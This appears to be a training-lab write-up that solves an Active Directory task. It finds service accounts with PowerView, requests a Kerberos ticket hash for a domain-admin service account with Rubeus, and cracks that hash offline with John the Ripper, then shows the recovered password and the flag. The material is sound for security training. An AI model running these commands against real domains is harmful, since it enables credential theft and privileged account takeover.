---
icon: vial
---

# 14 - Learning Object

## Tasks



1 - Using the Kerberoast attack, crack password of a SQL server service account

Flag 23 \[dcorp-dc] - SPN for which a TGS is requested 🚩



## Solutions

### 1 - Using the Kerberoast attack, crack password of a SQL server service account

First to all, we need to find out services running with user accounts as the services running with machine accounts have difficult passwords.

We can use PowerView's (Get-DomainUser -SPN) or ActiveDirectory module for discovering such services:

```powershell
C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
. C:\AD\Tools\PowerView.ps1
Get-DomainUser -SPN
```

```powershell
pwdlastset                    : 11/11/2022 9:59:41 PM
logoncount                    : 0
badpasswordtime               : 12/31/1600 4:00:00 PM
description                   : Key Distribution Center Service Account
distinguishedname             : CN=krbtgt,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local
objectclass                   : {top, person, organizationalPerson, user}
showinadvancedviewonly        : True
samaccountname                : krbtgt
admincount                    : 1
codepage                      : 0
samaccounttype                : USER_OBJECT
accountexpires                : NEVER
countrycode                   : 0
whenchanged                   : 11/12/2022 6:14:52 AM
instancetype                  : 4
useraccountcontrol            : ACCOUNTDISABLE, NORMAL_ACCOUNT
objectguid                    : 956ae091-be8d-49da-966b-0daa8d291bb2
lastlogoff                    : 12/31/1600 4:00:00 PM
whencreated                   : 11/12/2022 5:59:41 AM
objectcategory                : CN=Person,CN=Schema,CN=Configuration,DC=moneycorp,DC=local
dscorepropagationdata         : {5/17/2025 7:37:45 PM, 5/17/2025 6:37:45 PM, 5/17/2025 5:37:45 PM, 5/17/2025 4:37:45 PM...}
serviceprincipalname          : kadmin/changepw
usncreated                    : 12300
usnchanged                    : 12957
memberof                      : CN=Denied RODC Password Replication Group,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local
lastlogon                     : 12/31/1600 4:00:00 PM
badpwdcount                   : 0
cn                            : krbtgt
msds-supportedencryptiontypes : 0
objectsid                     : S-1-5-21-719815819-3726368948-3917688648-502
primarygroupid                : 513
iscriticalsystemobject        : True
name                          : krbtgt

logoncount               : 5
badpasswordtime          : 12/31/1600 4:00:00 PM
distinguishedname        : CN=web svc,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local
objectclass              : {top, person, organizationalPerson, user}
displayname              : web svc
lastlogontimestamp       : 10/25/2024 3:37:34 AM
userprincipalname        : websvc
whencreated              : 11/14/2022 12:42:13 PM
samaccountname           : websvc
codepage                 : 0
samaccounttype           : USER_OBJECT
accountexpires           : NEVER
countrycode              : 0
whenchanged              : 10/25/2024 10:37:34 AM
instancetype             : 4
usncreated               : 38071
objectguid               : b7ab147c-f929-4ad2-82c9-7e1b656492fe
sn                       : svc
lastlogoff               : 12/31/1600 4:00:00 PM
msds-allowedtodelegateto : {CIFS/dcorp-mssql.dollarcorp.moneycorp.LOCAL, CIFS/dcorp-mssql}
objectcategory           : CN=Person,CN=Schema,CN=Configuration,DC=moneycorp,DC=local
dscorepropagationdata    : {12/5/2024 12:47:28 PM, 11/14/2022 12:42:13 PM, 1/1/1601 12:00:01 AM}
serviceprincipalname     : {SNMP/ufc-adminsrv.dollarcorp.moneycorp.LOCAL, SNMP/ufc-adminsrv}
givenname                : web
usnchanged               : 255349
lastlogon                : 10/25/2024 3:37:34 AM
badpwdcount              : 0
cn                       : web svc
useraccountcontrol       : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD, TRUSTED_TO_AUTH_FOR_DELEGATION
objectsid                : S-1-5-21-719815819-3726368948-3917688648-1114
primarygroupid           : 513
pwdlastset               : 11/14/2022 4:42:13 AM
name                     : web svc

logoncount            : 41
badpasswordtime       : 11/25/2022 4:20:42 AM
description           : Account to be used for services which need high privileges.
distinguishedname     : CN=svc admin,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local
objectclass           : {top, person, organizationalPerson, user}
displayname           : svc admin
lastlogontimestamp    : 5/17/2025 2:45:48 AM
userprincipalname     : svcadmin
samaccountname        : svcadmin
admincount            : 1
codepage              : 0
samaccounttype        : USER_OBJECT
accountexpires        : NEVER
countrycode           : 0
whenchanged           : 5/17/2025 9:45:48 AM
instancetype          : 4
usncreated            : 40118
objectguid            : 244f9c84-7e33-4ed6-aca1-3328d0802db0
sn                    : admin
lastlogoff            : 12/31/1600 4:00:00 PM
whencreated           : 11/14/2022 5:06:37 PM
objectcategory        : CN=Person,CN=Schema,CN=Configuration,DC=moneycorp,DC=local
dscorepropagationdata : {5/17/2025 7:37:45 PM, 5/17/2025 6:37:45 PM, 5/17/2025 5:37:45 PM, 5/17/2025 4:37:45 PM...}
serviceprincipalname  : {MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local:1433, MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local}
givenname             : svc
usnchanged            : 332821
memberof              : CN=Domain Admins,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local
lastlogon             : 5/17/2025 10:11:41 AM
badpwdcount           : 0
cn                    : svc admin
useraccountcontrol    : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
objectsid             : S-1-5-21-719815819-3726368948-3917688648-1118
primarygroupid        : 513
pwdlastset            : 11/14/2022 9:06:37 AM
name                  : svc admin
```

&#x20;The svcadmin (domain administrator) has a SPN set, so we can Kerberoast it.

We can use Rubeus to get hashes for the svcadmin account. We can use the /rc4opsec option that gets hashes only for the accounts that support RC4, this means that if 'This account supports Kerberos AES 128/256 bit encryption' is set for a service account, the below command will not request its hashes (in this case it works using a new session without InviShell).

```bash
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args kerberoast /user:svcadmin /simple /rc4opsec /outfile:C:\AD\Tools\hashes.txt
```

<figure><img src="../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>

Now we can use John the Ripper or Hashcat to brute-force the hashes, but first to all remember to remove ":1433" from the SPN in hashes.txt:

<figure><img src="../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>

```bash
C:\AD\Tools\john-1.9.0-jumbo-1-win64\run\john.exe --wordlist=C:\AD\Tools\kerberoast\10k-worst-pass.txt C:\AD\Tools\hashes.txt
```

<figure><img src="../../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>

`*ThisisBlasphemyThisisMadness!!`



### Flag 23 \[dcorp-dc] - SPN for which a TGS is requested 🚩

```
serviceprincipalname  : {MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local:1433, MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local}
```

MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local is the SPN for which a TGS is requested.
